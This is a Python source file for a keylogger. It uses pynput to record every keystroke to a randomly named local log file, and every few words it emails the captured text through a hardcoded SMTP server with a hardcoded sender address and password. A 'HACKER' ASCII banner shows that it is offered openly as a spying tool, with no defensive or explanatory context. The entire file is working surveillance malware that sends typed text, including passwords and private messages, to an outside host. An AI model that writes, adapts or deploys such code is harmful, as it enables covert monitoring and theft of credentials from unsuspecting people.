import logging, smtplib

from pynput.keyboard import Key, Listener
from random import randint

output = '3ke' + str(randint(0, 10000)) + '.txt'

log_dir = ""

logging.basicConfig(filename=(log_dir + output), level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("""
//    _   _      _        ____   _  __  U _____ u   ____     
//   |'| |'| U  /"\  u U /"___| |"|/ /  \| ___"|/U |  _"\ u  
//  /| |_| |\ \/ _ \/  \| | u   | ' /    |  _|"   \| |_) |/  
//  U|  _  |u / ___ \   | |/__U/| . \\u  | |___    |  _ <    
//   |_| |_| /_/   \_\   \____| |_|\_\   |_____|   |_| \_\   
//   //   \\  \\    >>  _// \\,-,>> \\,-.<<   >>   //   \\_  
//  (_") ("_)(__)  (__)(__)(__)\.)   (_/(__) (__) (__)  (__)""")

email = 'me@arinzejustinng.com.ng'
password = 'meemail@website'
server = smtplib.SMTP_SSL('mail.arinzejustinng.com.ng', 465)
server.login(email, password)

full_log = ""
word = ""
email_char_limit = 10


def on_press(key, false=None):
    global word
    global full_log
    global email
    global email_char_limit
    logging.info(str(key))

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return false


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


with Listener(on_press=on_press) as listener:
    listener.join()
